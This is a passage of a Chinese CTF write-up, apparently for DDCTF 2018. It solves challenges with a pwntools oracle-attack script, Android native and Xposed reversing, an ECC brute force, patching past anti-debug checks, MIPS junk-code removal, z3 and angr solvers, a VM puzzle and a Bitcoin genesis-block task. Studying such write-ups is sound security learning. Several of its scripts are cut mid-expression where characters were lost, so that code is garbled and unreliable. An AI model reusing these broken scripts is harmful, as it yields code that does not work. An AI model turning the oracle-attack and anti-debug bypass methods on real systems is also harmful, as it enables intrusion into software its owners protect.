r.recvuntil('mission key:') r.sendline(mission_key) r.recvuntil('communications:') agent_id = 'a' * (13+16*8-len(flag)) r.sendline(agent_id) r.recvline() enc = r.recvline().rstrip()[32*11:32*12] if LOG: print 'enc=%s' % enc for i in string.printable[:-5]: r.recvuntil('to exit:') message = 'Connection for mission: %s, your mission\\'s flag is: %s' % (agent_id, flag + i) r.sendline(message[-16:]) r.recvline() enc_tmp = r.recvline().rstrip() if LOG: print 'enc_tmp=%s' % enc_tmp if enc_tmp == enc: flag += i break r.close() if flag[-1:] == '}': break print 'flag=%s' % flag print 'Flag: %s' % flag Flag: DDCTF{87fa2cd38a4259c29ab1af39995be81a} Android 感谢LeadroyaLshi师傅！ LeveL1 Java 层什么都没有，直接看 native；native 里包含了一些数学计算。 有 init_array ，但里面主要是一些线程相关操作的初始化，没有JNI_OnLoad。 int __fastcall Java_com_didictf_guesskey2018one_MainActivity_stringFromJNI(JNIEnv *a1, jobject a2, jstring a3) { i = 0; bInput = (*a1)->GetStringUTFChars(a1, a3, 0); j_j_GetTicks(); do v10 = j_j_gpower(i++); while ( i != 32 ); j_j_GetTicks(); fromBytes((String *)&p_string, bInput); v5 = (String *)fromString((String *)&cp_string, (String *)&p_string); ret = j_j_j__Z20__aeabi_wind_cpp_prjSs((int)v5); finiString((int *)(cp_string - 12)); finiString((int *)(p_string - 12)); return ret; } 上来先算了32次平方，不知道想干嘛，调用2次GetTicks，不知道想干嘛。之后把输入转为std::string类型，进入check` 函数。 首先检测长度是否为36，以及与 const-data 进行 xor。 while ( 1 ) { if ( v13 >= 1 && currentOff 这个地方校验第0~10、第11~20、第21~30、第30~40是否一模一样。 最后的检测是 if ( v24 ) goto LABEL_40; // if a%b == 0 v26 = j_j_j___aeabi_uldivmod(divisor, dividend); v3 = 1; v25 = (unsigned int)dividend >= (unsigned int)v26; LODWORD(v26) = 1; if ( v25 ) LODWORD(v26) = 0; v27 = 1; if ( HIDWORD(dividend) >= HIDWORD(v26) ) v27 = 0; if ( HIDWORD(dividend) != HIDWORD(v26) ) LODWORD(v26) = v27; if ( !(_DWORD)v26 ) LABEL_40: v3 = 0; finiString((int *)v30 - 3); 这里v3最后被返回了，要求是前者能够整除后者，而且会有除数和商的大小比较，只有除数大于上时候才有可能返回1。 dividend = j_j_atoll((const char *)a1->ptr); 往上翻，发现输入仅与除数有关。 被除数是由两个字符串算出来的，怎么算出来的我也看不大懂，好像是重新组合成一个字符串，拼接字符什么样的，应该可以直接 dump。 【后来看某位老哥写的 writeup，发现是通过2个字符串取 index 得到的】 https://blog.csdn.net/dydxdz/article/details/80037937 map1 = {} str1 = 'deknmgqipbjthfasolrc' for i in range(len(str1)): map1[str1[i]] = i/2 str2 = 'jlocpnmbmbhikcjgrla' k = [] for i in range(len(str2)): print map1[str2[i]], 先创建 map ，第 i 个 char对应的数字是i/2 ，刚好得到每个 char 对应 [0,10) 的数字；再查询 str2里每个 char 所对应的下标，将这个下标加上 '0' ，拼起来，得到新的十进制的字符串。 综上，拿到数字 5889412424631952987 ，将它分解了， 5889412424631952987=1499419583*3927794789 ，输入就是偏大的数字， 1499419583 ，再 xor 一下常量就行了。 最后 flag 是 d5axivcw6ggfswpxg80estgc58h7yghqogbm 。 LeveL2 看起来使用的是 Robust 的热更新框架，没有做太特殊的处理，在 assets 里存放了 GeekTan.BMP ，其实是个 zip 包，里面放着 Robust 的 patch 文件。 有简单的方法，也有复杂的方法，复杂的就是肉眼去看，把代码运行一遍即可，是个约瑟夫问题，也可以直接求解，跟我以前出的用栈写约瑟夫很像。 简单的方法嘛，直接上 xposed input text DDCTF{2517299225169920} XposedHelpers.findAndHookMethod(\"cn.chaitin.geektan.crackme.MainActivity\", loader, \"Joseph\", int.class, int.class, new XC_MethodHook() { @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable { super.beforeHookedMethod(param); new Exception().printStackTrace(); Log.d(TAG, \"======== before hook =======\"); Log.d(TAG, \"with \" + (int) param.args[0] + \" and\" + (int) param.args[1]); } @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable { super.afterHookedMethod(param); Log.d(TAG, \"======== after hook =======\"); Log.d(TAG, \"result is \" + param.getResult()); } }); LeveL3 Java 层什么都没有，直接看 native。 init_array应该是初始化一些东西，没有过多操作。 没有JNI_OnLoad。 直接看 JNI的方法，进入之后先将输入转化为 std::string ，再使用 str2ll转为int64。 长得比较丑，看起来是做divmod(int64, int64)，循环终止的条件是i==int64(input)，最后检测余数是否和预期相等。 debug 一下，大概就是左移1bit，mod 一下，左移1bit，mod 一下这样，写段 python 爆破即可。 DDCTF{ddctf-android2-KEY} p = 0x17A904F1B91290 mod = 0xDBDEE7AE5A90 In [23]: i = 1 ...: remain = 1 ...: while True: ...: remain = ((remain > 32), hex(remain & 0xFFFFFFFF) ...: break ...: i += 1 ...: 595887 241750416186000 0xdbdeL 0xe7ae5a90L 不知道这题想干嘛。。。 LeveL4 这次只有 java 层，没有 native 层，看起来使用了公开的第三方库 spongycastle，所以丢到网站上 deguard 一下，得到一个非常优美的结果~ 官方说是10位以内的数字，所以是暗示爆破，而且 ECC 么，除了爆破也没有办法。 public MainActivity() { super(); this.editText = \"00C3632B69D3FC1DD8D80C288C44281B67F4828DC77E37EE338E830E66DC71972A008835BA3156353815DFEDEB4330B48B454F35A88D83DA6260C206E4A619753F97\"; } public void onClickTest(View arg24) { this.outputView.setText(\"Empty Input\"); TextView v1 = this.preview; this = this; String v4 = v1.getText().toString(); String v5 = v4; if(v4.length() == 0) { v5 = \"1\"; } new R$id().init(); ECPoint v11 = SECNamedCurves.getByName(\"secp256k1\").getG().multiply(new BigInteger(v5.getBytes())); BigInteger v8 = v11.getXCoord().toBigInteger(); BigInteger v13 = v11.getYCoord().toBigInteger(); byte[] v14 = v8.toByteArray(); byte[] v15 = v13.toByteArray(); byte[] v9 = new byte[v14.length + v15.length]; int v6; for(v6 = 0; v6 使用的是 ECC 加密算法，使用secp256k1曲线，先拿到 G 点，与输入进行椭圆域上的相乘，得到新的点，去校验计算出来的点是否是预先规定好的那个点，是的话就 return true 。 这个没什么操作，就是按照描述去爆破，一开始懒得写 java 代码，直接在手机上爆破的（原谅我脑残），发现速度简直慢到炸，手机烫了一晚上也没跑多少数据。 然后想着优化，但发现这个 API 似乎很不好用， G+G+G 和 G*3 不相等，以及各种神奇的表现，可能是我不大会用API吧，按理说加法比乘法好做很多，每次加一比每次乘法应该要快，但优化时候老是算出来的不一样，就懒得优化了。 最后在 PC上写个爆破脚本，早上起来就看到了 flag，DDCTF{54135710}。 LeveL5 这题就是反调试的大集合，乱七八糟的方式什么都有，Java 层没有东西，直接看 native。 init_array 没有特殊操作，是 C++的初始化。 JNI_OnLoad里动态注册了 JNI 函数，没有额外操作。 直接看了哈，最原始的长这样 int __fastcall Java_check(const char *b_input) { void *v2; // r0@1 void *v3; // r5@1 int i; // r2@4 char v6[32]; // [sp+4h] [bp+0h]@1 memset(v6, 0, 0x20u); v2 = dlopen(\"libc.so\", 0); v3 = v2; if ( v2 ) { open = (int (__fastcall *)(_DWORD, _DWORD, _DWORD))dlsym(v2, \"open\"); close = (int (__fastcall *)(int))dlsym(v3, \"close\"); read = (int (__fastcall *)(_DWORD, _DWORD, _DWORD))dlsym(v3, \"read\"); strncmp = (int (__fastcall *)(_DWORD, _DWORD, _DWORD))dlsym(v3, \"strncmp\"); strstr = (int)dlsym(v3, \"strstr\"); } isTraced = 0; setValue(dword_EF2B5024); maybe_antidebug_1(); some_encrypt_2(dword_EF2B5024, v6); if ( strlen(b_input) == 32 ) { i = 0; do { v6[i] ^= b_input[i]; ++i; } while ( i != 32 ); memcpy(&unk_11100, &v7, 0x20u); // return strncmp(xx, xx, 32); // patch by LeadroyaL } return -1; } 将输入操作一下，xor 一下，返回的是 strncmp 的结果，这不是送分题么？直接上去调试，断下来，发现答案并不对。。。有几个反调试的函数，把 xor_key 给修改了。 sub_3c54是第一个函数，先做一些不知道什么的操作，再检测 tracerPid那行的 strlen ，可以绕过，然后去从sha256_table里取一些值，不知道想干嘛。内层还有一堆不知道在干嘛的函数，估计藏了一些反调试，而且会对 global 的值进行一些操作，乱七八糟的。 反正每次都会被测到反调试，于是懒得搞了，我认输，ok？ patch 一下binary文件，因为是简单的 xor，所以只要能拿到xor_key 即可，在最后一句他是strncmp，如果把它 patch为memcpy的话，在正常运行过程中，就可以将算出来的密文保存下来。之后想办法dump内存，就能拿到密文，与输入进行xor，就拿到了 key。 经过一番努力，终于patch成功了。。。如上图的最后一个 memcpy。 先运行，让它算一遍，再attach，断在最开始，就能拿到明密文对了。 最后算出来是DDCTF{GoodJob,Congratulations!!}。 逆向 感谢奈沙夜影师傅！ Baby MIPS IDA打开发现几个字符串结构都很清晰，提供16个变量，然后进行16次方程校验，但是运行会发现在中间就因为段错误而异常，尝试许久以后发现几个不太对劲的指令，突兀出现的t, sp, 跳转等等的机器码都为EB02开头，猜测为花指令，于是使用IDC脚本去花。 注意MIPS为定长指令集，每个指令都为4字节，因此需要固定监测指令的头部，否则可能会误清除掉正常指令，例如方程参数的赋值 (╯‵□′)╯︵┻━┻ #include static matchBytes(StartAddr, Match) { auto Len, i, PatSub, SrcSub; Len = strlen(Match); while (i 去花后再次分析即可得到清晰的赋值和check过程 有三种求解方法: 方法一：简单粗暴反汇编 写了一个伪执行汇编的py脚本来得到参数，最后清洗一下即可得到方程，通过z3限制BitVec即可跑出整数解 f = open(\"code.txt\", \"r\") flower = [\"slti\", \"sdc1\"] a0 = 0x76ff270 v0 = 0xd0000 v1 = 8 fp = [0 for i in range(0x500)] table = [0x0, 0x42d1f0, 0x0, 0x42d1f0, 0xa, 0xa, 0x0, 0x9, 0x4250bc, 0x9, 0x426630, 0x42d1f0, 0x40a3ec, 0x37343431, 0x363434, 0x0, 0x0, 0x42d1f0, 0x0, 0x4250bc, 0x0, 0x0, 0x425060, 0x42d1f0, 0x403ad0, 0x0, 0x0, 0x1000, 0x425088, 0x76fff184, 0x412fcd, 0x1, 0x410570, 0x425190, 0x40ca48, 0x0, 0x0, 0x42d1f0, 0x0, 0x42d1f0, 0x425088, 0xffffffff, 0x4106c4, 0xffffffff, 0x76fff184, 0x412fcd, 0x1, 0x42d1f0, 0x0, 0x425088, 0x40ccac, 0x0, 0x0, 0x0, 0x0, 0x42d1f0, 0x0, 0x425190, 0x76ffeef8, 0x425190, 0x10, 0x425088, 0x40baac, 0x42d1f0, 0x412fcd, 0x1, 0x425088, 0x40baac, 0x76fff184, 0x412fce, 0x40b684, 0x0, 0x0, 0x0, 0x0, 0x42d1f0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x42d1f0, 0x0, 0x42d1f0, 0x0, 0x4250bc, 0x413081, 0x9, 0x403f24, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x42d1f0, 0x0, 0x413078, 0x0, 0x0, 0x0, 0x0, 0xd0000, 0xf1f4, 0xcf8, 0xf5f1, 0x7883, 0xe2c6, 0x67, 0xeccc, 0xc630, 0xba2e, 0x6e41, 0x641d, 0x716d, 0x4505, 0x76fff224, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xfffffffe, 0x0, 0x76fff2ac, 0x412fcd, 0x1, 0x0, 0x6, 0x7fffffff, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa, 0xa, 0x425088, 0x8, 0x7ffffff8, 0x100, 0x413f38, 0x1, 0x413f38, 0x0, 0x2, 0x76fff0f8, 0x0, 0x0, 0x7fffffff, 0x76fff220, 0x405050, 0x550001, 0x0, 0x425000, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x76fff220, 0x404d84, 0x42d1f0, 0x0, 0x500, 0x5, 0x42d1f0, 0xb3b, 0x76fff224, 0x115, 0x1a131100, 0x76fff220, 0x76fff270, 0x76fff2ac, 0xffbecf88, 0xa, 0x405880] j = 0 functions = 0 for i in range(0xb4, 0x410, 4): fp[i] = table[j] j += 1 input = [int(str(i)*3, 16) for i in range(16)] try: while(True): code = f.readline() if(code == \"\"): print(\"finish\") break if(code[:3] == \"loc\"): # print(\"n[s]:t\" + code[:-1]) continue if(code.find(\"nop\")!=-1): continue code = code.split(\"$\") # print(code) c = code[0].strip() if(c==\"sw\"): n1 = code[1].split(\",\")[0] n2 = 0x410 - int(\"0x\" + code[1].split(\"_\")[1].split(\"(\")[0], 16) code = (\"fp[\" + hex(n2) + \"] = \" + n1) elif(c==\"li\"): n1 = code[1].split(\",\")[0] n2 = code[1].split(\",\")[1].strip() code = (n1 + \" = \" + n2) elif(c==\"lw\"): n1 = code[1].split(\",\")[0] if(\"\".join(code).find(\"fp\")!=-1): n2 = 0x410 - int(\"0x\" + code[1].split(\"_\")[1].split(\"(\")[0], 16) code = (n1 + \" = fp[\" + hex(n2) + \"]\") # print(\"# \" + hex(fp[n2])) #输出方程 print(\"0x%x*\"%fp[n2],end='') else: # print(\"[c]:t\" + \"\".join(code)[:-1], \"v0=%x\"%v0) n2 = ((v0) + int(code[1].split(\",\")[1].replace(\"(\", \"\")))//4 code = (n1 + \" = input[\" + str(n2) + \"]\") print(\"a[%d]\"%n2) # print(code) # print(hex(v0)) # break elif(c==\"sll\"): n1 = code[1].split(\",\")[0] n2 = code[1].split(\",\")[1].strip() code = (n1 + \" = \" + n1 + \">\" + n2) elif(c==\"xori\"): n1 = code[1].split(\",\")[0] n2 = code[1].split(\",\")[1].strip() code = (n1 + \" = \" + n1 + \"^\" + n2) elif(c==\"addiu\"): n1 = code[1].split(\",\")[0] n2 = code[1].split(\",\")[1].strip() code = (n1 + \" = \" + n1 + \"+\" + n2) # print(\"+\") elif(c==\"mul\"): n1 = code[1].split(\",\")[0] n2 = code[2].split(\",\")[0].strip() n3 = code[3].strip() code = (n1 + \" = \" + n2 + \"*\" + n3) elif(c==\"addu\"): n1 = code[1].split(\",\")[0] n2 = code[2].split(\",\")[0].strip() code = (n1 + \" = \" + n1 + \"+\" + n2) print(\"+\") elif(c==\"subu\"): n1 = code[1].split(\",\")[0] n2 = code[2].split(\",\")[0].strip() code = (n1 + \" = \" + n1 + \"-\" + n2) print(\"-\") elif(c==\"beq\"): print(\"=0x%x\"%(v0)) print(\"================================================one function=====================================\") functions +=1 continue elif(c==\"negu\"): n1 = code[1].split(\",\")[0] n2 = code[2].split(\",\")[0].strip() code = (n1 + \" = \" + \"-\" + n2) print(\"-\") elif(c==\"nop\"): continue elif(c==\"lui\"): n1 = code[1].split(\",\")[0] n2 = code[1].split(\",\")[1].strip() code = (n1 + \" = \" + n2 + \"方法二：优雅反编译 在某zhao师傅的提醒下想起来jeb的MIPS版本可以对汇编进行简单的反编译： 虽然数组全部是通过指针+偏移的方式来调用，不过可以全部复制下来再用正则来整理数据，将*(par00+x)替换为par00[x/4]的形式（可不要像某zhao师傅一样将参数一个个抄下来哟（不然就会像他一样把参数不慎抄错几个然后纠结若干小时XDDDDDD 上述两种方法得到方程以后就可以通过z3, numpy, matlab一类的数学工具求解方程组了，下面给出z3py的示例代码 from z3 import * a = [BitVec(\"a%d\"%i, 32) for i in range(16)] s = Solver() s.add(0xca6a*a[0] -0xd9ee*a[1] +0xc5a7*a[2] +0x19ee*a[3] +0xb223*a[4] +0x42e4*a[5] +0xc112*a[6] -0xcf45*a[7] +0x260d*a[8] +0xd78d*a[9] +0x99cb*a[10] -0x3e58*a[11] -0x97cb*a[12] +0xfba9*a[13] -0xdc28*a[14] +0x859b*a[15] == 0xaa2ed7) s.add(0xf47d*a[0] +0x12d3*a[1] -0x4102*a[2] +0xcedf*a[3] -0xafcf*a[4] -0xeb20*a[5] -0x2065*a[6] +0x36d2*a[7] -0x30fc*a[8] -0x7e5c*a[9] +0xeea8*a[10] +0xd8dd*a[11] -0xae2*a[12] +0xc053*a[13] +0x5158*a[14] -0x8d42*a[15] == 0x69d32e) s.add(0xffff52cf*a[0] -0x4fea*a[1] +0x2075*a[2] +0x9941*a[3] -0xbd78*a[4] +0x9e58*a[5] +0x40ad*a[6] -0x8637*a[7] -0x2e08*a[8] +0x4414*a[9] +0x2748*a[10] +0x1773*a[11] +0xe414*a[12] -0x7b19*a[13] +0x6b71*a[14] -0x3dcf*a[15] == 0x3b89d9) s.add(0xffffedd7*a[0] -0x1df0*a[1] +0x8115*a[2] +0x54bd*a[3] -0xf2ba*a[4] +0xdbd*a[5] +0x1dcf*a[6] +0x272*a[7] -0x2fcc*a[8] -0x93d8*a[9] -0x6f6c*a[10] -0x98ff*a[11] +0x2148*a[12] -0x6be2*a[13] +0x2e56*a[14] -0x7bdf*a[15] == 0xff6a5aea) s.add(0xffffa8c1*a[0] +0xdc78*a[1] -0x380f*a[2] +0x33c0*a[3] -0x7252*a[4] -0xe5a9*a[5] +0x7a53*a[6] -0x4082*a[7] -0x584a*a[8] +0xc8db*a[9] +0xd941*a[10] +0x6806*a[11] -0x8b97*a[12] +0x23d4*a[13] +0xac2a*a[14] +0x20ad*a[15] == 0x953584) s.add(0x5bb7*a[0] -0xfdb2*a[1] +0xaaa5*a[2] -0x50a2*a[3] -0xa318*a[4] +0xbcba*a[5] -0x5e5a*a[6] +0xf650*a[7] +0x4ab6*a[8] -0x7e3a*a[9] -0x660c*a[10] +0xaed9*a[11] -0xa60f*a[12] +0xf924*a[13] -0xff1d*a[14] +0xc888*a[15] == 0xffd31341) s.add(0x812d*a[0] -0x402c*a[1] +0xaa99*a[2] -0x33b*a[3] +0x311b*a[4] -0xc0d1*a[5] -0xfad*a[6] -0xc1bf*a[7] -0x1560*a[8] -0x445b*a[9] -0x9b78*a[10] +0x3b94*a[11] +0x2531*a[12] -0xfb03*a[13] +0x8*a[14] +0x8721*a[15] == 0xff9a6b57) s.add(0x15c5*a[0] +0xb128*a[1] -0x957d*a[2] +0xdf80*a[3] +0xee68*a[4] -0x3483*a[5] -0x4b39*a[6] -0x3807*a[7] -0x4f77*a[8] +0x652f*a[9] -0x686f*a[10] -0x7fc1*a[11] -0x5d2b*a[12] -0xb326*a[13] -0xacde*a[14] +0x1f11*a[15] == 0xffd6b3d3) s.add(0xaf37*a[0] +0x709*a[1] +0x4a95*a[2] -0xa445*a[3] -0x4c32*a[4] -0x6e5c*a[5] -0x45a6*a[6] +0xb989*a[7] +0xf5b7*a[8] +0x3980*a[9] -0x151d*a[10] +0xaf13*a[11] +0xa134*a[12] +0x67ff*a[13] +0xce*a[14] +0x79cf*a[15] == 0xc6ea77) s.add(0xffff262a*a[0] +0xdf05*a[1] -0x148e*a[2] -0x4758*a[3] -0xc6b2*a[4] -0x4f94*a[5] -0xf1f4*a[6] +0xcf8*a[7] +0xf5f1*a[8] -0x7883*a[9] -0xe2c6*a[10] -0x67*a[11] +0xeccc*a[12] -0xc630*a[13] -0xba2e*a[14] -0x6e41*a[15] == 0xff1daae5) s.add(0xffff9be3*a[0] -0x716d*a[1] +0x4505*a[2] -0xb99d*a[3] +0x1f00*a[4] +0x72bc*a[5] -0x7ff*a[6] +0x8945*a[7] -0xcc33*a[8] -0xab8f*a[9] +0xde9e*a[10] -0x6b69*a[11] -0x6380*a[12] +0x8cee*a[13] -0x7a60*a[14] +0xbd39*a[15] == 0xff5be0b4) s.add(0x245e*a[0] +0xf2c4*a[1] -0xeb20*a[2] -0x31d8*a[3] -0xe329*a[4] +0xa35a*a[5] +0xaacb*a[6] +0xe24d*a[7] +0xeb33*a[8] +0xcb45*a[9] -0xdf3a*a[10] +0x27a1*a[11] +0xb775*a[12] +0x713e*a[13] +0x5946*a[14] +0xac8e*a[15] == 0x144313b) s.add(0x157*a[0] -0x5f9c*a[1] -0xf1e6*a[2] +0x550*a[3] -0x441b*a[4] +0x9648*a[5] +0x8a8f*a[6] +0x7d23*a[7] -0xe1b2*a[8] -0x5a46*a[9] -0x5461*a[10] +0xee5f*a[11] -0x47e6*a[12] +0xa1bf*a[13] +0x6cf0*a[14] -0x746b*a[15] == 0xffd18bd2) s.add(0xf81b*a[0] -0x76cb*a[1] +0x543d*a[2] -0x4a85*a[3] +0x1468*a[4] +0xd95a*a[5] +0xfbb1*a[6] +0x6275*a[7] +0x30c4*a[8] -0x9595*a[9] -0xdbff*a[10] +0x1d1d*a[11] +0xb1cf*a[12] -0xa261*a[13] +0xf38e*a[14] +0x895c*a[15] == 0xb5cb52) s.add(0xffff6b97*a[0] +0xd61d*a[1] +0xe843*a[2] -0x8c64*a[3] +0xda06*a[4] +0xc5ad*a[5] +0xd02a*a[6] -0x2168*a[7] +0xa89*a[8] +0x2dd*a[9] -0x80cc*a[10] -0x9340*a[11] -0x3f07*a[12] +0x4f74*a[13] +0xb834*a[14] +0x1819*a[15] == 0xa6014d) s.add(0x48ed*a[0] +0x2141*a[1] +0x33ff*a[2] +0x85a9*a[3] -0x1c88*a[4] +0xa7e6*a[5] -0xde06*a[6] +0xbaf6*a[7] +0xc30f*a[8] -0xada6*a[9] -0xa114*a[10] -0x86e9*a[11] +0x70f9*a[12] +0x7580*a[13] -0x51f8*a[14] -0x492f*a[15] == 0x2fde7c) if(s.check()==sat): c = b'' m = s.model() for i in range(16): print(\"a[%d]=%d\"%(i, m[a[i]].as_long())) for i in range(16): print(chr(m[a[i]].as_long()&0xff), end='') 方法三：符号执行 无名侠师傅提出了使用angr来全自动求解的方法，注意二进制文件也需要去过花。我这边不知道是因为capstone没有mips反编译的版本还是地址扒错了跑不出来，只好直接附上师傅的脚本。 注意其中find和avoid的值由于各人的bin文件不同，因此地址需要自行修正。 from angr import * import logging import IPython logging.getLogger('angr.manager').setLevel(logging.DEBUG) p = Project('mips2') state = p.factory.blank_state(addr=0x400420) DATA_ADDR = 0xA0000 state.regs.a0 = DATA_ADDR for i in range(16*4): vec = state.solver.BVS(\"c{}\".format(i),8,explicit_name=True) cond = state.solver.And(vec>=32,vec 黑盒破解 这个题目比较硬核，输入的地方通过比较字符串来选择函数。首先通过构造函数找到整个数据结构的定义 偏移 值 类型 长度 备注 a1 sth_p q 0x100 a1+8 char_table_0_p q 0x100 0x6030e0 a1+16 input c 100 a1+272 rand%50 a1+280 char_table_0_p-sth_p q a1+288+8 char_table_2 d 8 (a1+8)[72+l] 6030e0[l+255] a1+408 char_table_1 b 255 0x603700 a1+672 func_addr q 255 (a1+8)[84+i] 603200+i(+=) a1+672+8 func_table q 8 (a1+8)[84+6030e0[l+255]] 输入函数形式为： for i in range(len(input)): *(a1+664) = input[i+1] for j in range(8): if(f[input[i]] == (a1 + 408)[(a1+8)[72+j]]): call (a1+8)[84 + (a1+8)[j+72]] ( a1 ) 可以看到，实际上就是令Input[i]作为下标取数组f的值，然后遍历char_table_1中的8个值，如有相等的则取func_addr中对应的函数来调用。 一共8个函数，根据提示语可以定位到其中的一个函数，查看交叉引用则能找到另外8个函数的函数表： 逐个反编译发现： 函数名 执行条件 表达式 功能 func_0 (a1+288) (a1+665) = char_table[a1+288] m=c[index] func_1 (a1+288) char_table[a1+288] = (a1+665) c[index]=m func_2 … (a1+665) = (a1+665) + (a1+664) – 33 m+=[next]-33 func_3 … (a1+665) = (a1+665) – ((a1+664) – 33) + 1 m-=[next]-33 func_4 … (a1+288)++ index++ check_func *(a1+664)==’s’ s = char_table_0[(a1+288)], len=20,puts(s) check(s) func_6 … (a1+288)– index– func_7 … 后一个参 char_table_0[a1+288] = input[(a1+288) + (a1+664) – 48] – 49 其中用到的变量一共有4个： a1+292 = 255 a1+664 = [next]（即input[i+1]) a1+665 = m（临时变量） a1+288 = index 在check_func中会输出s，s是从char_table_0中以index为起点取的0x20个值。如果s满足三个方程则通过校验，返回成功。 而实际上那三个方程是不需要逆的—题目中明示了只要输出“Binggo”即可得到flag。因此目标显然是在char_table_0中获得Binggo的字符串，将其dump出来输出了一下发现并字符顺序并没有合适的，甚至上述5个字母都不齐。以及一个最关键的问题，check_func中取了0x20个值赋给s，这显然不符合”Binggo”的要求，因此第七个字符必须给上”使其截断才行。 分析其余7个函数，发现0和1可以交换char_table_0中的字符的位置，2、3和7则可以修改char_table_0中字符的值，4和6则是用来移动下标的，最后check_func加’s’来结束并输出。在构造输入之前，先要找到函数对应的输入值。 逆向一下发现char_table中还被更改了值，IDA动态调试断在函数调用处调用idc脚本,即可得到对应值： auto i, j, v14, p, q; for(i=0;i24 $ 400dc1 38 8 400e7a 43 C 400f3a 74 t 401064 * 30 0 4011c9 45 E 40133d 75 u 4012f3 * 23 # 4014b9 得到这8个输入字符即可开始构造了。 由于函数功能很多样，因此构造方法很多，在此仅表述我的构造方法： 由于输入buffer有限，因此不适合向右移动指针太多来找寻合适的字符。所以我就原地变换—毕竟将一个字符变成另一个字符满打满算也只要4个输入，移动指针可就轻而易举几十上百了。 下列计划中push表示将char_table中的值取入m，A->B表示将A通过func_2和3变换成B，->1表示指针后移1位 push P # $ P->B # t/ pop B # 8 #111(用于填充make，其实1个就够，懒得算了233) B->i # CH ->1 # 0 pop i # 8 i->n # C& ->1 # 0 pop n # 8 ->1 # 0 n->g # t( pop g # 8 ->1 # 0 pop g # 8 g->o # C) ->1 # 0 pop o # 8 ->1 # 0 make x00 # #0 其中的111是为了make x00，在指针指向第七个字符时直接构造，提交给服务器即可获得flag。相对而言我觉得这题是所有（re和安卓）题目中质量最高和最（逆向过程中）有趣的~ 被隐藏的真实 这题本来单纯地以为是很简单的题，听欧佳俊师傅讲了一下出题思路才发现他的想法真的比答题人多得多…… main函数里调用了三次get_pwd()这个函数来check输入 get_pwd中接受输入，然后对count自增，调用了Bitcoin对象的一个函数来校验输入 如果熟悉C++逆向的话，一眼就能看出来这是在调用虚函数 因为v2是对象的空间，在C++的对象构造中，开头4个字节指向的是虚函数表 v2指向的是虚函数表，*v2就是虚函数表的第一个函数了 （图片引自C++对象模型详解释https://www.cnblogs.com/tgycoder/p/5426628.html） 做题的时候不是很熟悉C++的模型，以及虚函数反编译的不是很明显，直接动态调试做的。初始状态这个虚函数是init，其中调用了verify，第一次直接返回输入，对应输出列表的需求，要输入0xdeadbeef的小端序表示”efbeadde”。如果纯静态逆向，会继续往下看verify函数的第二、三次校验，但事实上第二次就没有调用init了。 我在做的时候因为不熟悉虚函数，所以动态调试直接跟进函数，发现进入了sub_4046D7这个函数，其中的核心函数b58e乍看起来很复杂，但其实通过其中的24（实际上是256）、%58，和题目内的信息描述很容易想到比特币地址转换方法–base58 直接进行解密获得bytes类型即可通关（注意最后4字节是sha256的验算字节，不可提交，否则会导致flag的sha256计算错误。因为第二关仅截取19个字符送入，但跟flag有关的sha256却会把所有input全部进行运算，导致最后提示Correct实际上的flag却不对） 话是这么说，直接套来的脚本解密出来其实没看懂，还是自己查资料从加密到解密走了一趟才get到应该是hex格式。第三小关本来以为是脑洞题了，其实是误打误撞做出来的，运气是真的好OTZ 这次虚函数又回到了verify，将Input进行两次sha256然后逆序与结果比较，当时的想法是结合提示语： 查了一下发现这条地址是中本聪在开始比特币时记录的第一个块–创世块，刚开始想到的是根据创世块向区块链后端爆破，某个区块的sha将会满足要求。不过查了一下好像也没什么适合计算的，总不能自己重复一遍挖矿过程吧233 卡了许久，代码中突然发现一个关键点 长度80是个很关键的提示！ 于是去找了区块链结构解析，发现区块头的长度正好是80个字节 https://webbtc.com/block/000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f.hex 在这里得到了创世块的头部信息，提交即可获得flag 事实上在经过家俊师傅的讲解后，再回头逆才发现这里的memcmp被覆盖到了sub_404A36函数 这个函数中通过异或生成了一个串，然后将输入的字符串与做过两次sha256再逆序的输入进行memcmp。这个两次sha256再逆序的操作，在之前的查资料过程中发现就是比特币的哈希方法，把异或生成的串dump出来去搜索。 IDC>auto i;for(i=0;i发现是创世块的哈希值，由此倒推出原输入是创世块。 比赛的时候从一个长度猜到创世块头部，不得不感叹自己的运气真的是…… 最后再分析一下虚函数的覆盖，和家俊师傅挖下的种种坑 首先注意到虚函数表中的第一个函数在初始情况下是Init 逐步跟踪，发现Bitcoin在构造函数中就有玄机 这里跳转到了0x6D0F88处，过去看看 这时是直接一个leave和retn返回了 但是后面有很多不可识别的脏数据，暂且先放着不管，继续往后走 get_pwd函数中就如之前分析的一样，没什么问题 问题在于析构函数里 乍一看好像没什么问题哦，delete释放空间嘛 注意这里的(this+3)指向的就是刚才跳转的0x6D0F88 再点进delete内一看 ？！ 跟正常调用free的delete完全不一样，左边function列表中也竟然出现了两个同名的函数 另外一个才是调用free的原delete，这个是冒牌的！ 这里利用的是IDA的重命名机制–C++编译器为了区分重载函数，会对函数生成一些其他字符来修饰。delete函数被修饰以后的名称是”_ZdaPv”，但是冒牌delete函数的原名是”__ZdaPv”，IDA同样也会将其重命名为delete，导致被忽视。 这个delete中将参数指向的空间写为0x90，即NOP的机器码 因此可以将刚才的leave、retn和大量脏数据全部写成NOP，从而使下一次调用构造函数的时候可以执行一些其他代码，而这个机密的函数就是脏数据之后的代码，sub_6D1048 这里的a1是rbp，频繁调用的a1-8就是this指针 可以看到，每次调用都会覆盖一次虚函数 另外当第三次执行的时候会将memcmp重写 整个理透以后这个题目学到的应该是最多的，各种阴险技术，真的很有意思23333 可惜做的时候动态跟过去会忽视掉这里的大量重写，比较可惜 探寻逝去的Atlantis文明 打开文件发现啥都没有 运行杀毒软件提示有代码混淆器 OD挂上各种报错，估计有反调 于是从头分析，首先是两个TlsCallback TlsCallback_0中第一个函数sub_402B30动态获取了ZwSetInformationThread设置当前线程的信息 v0 = 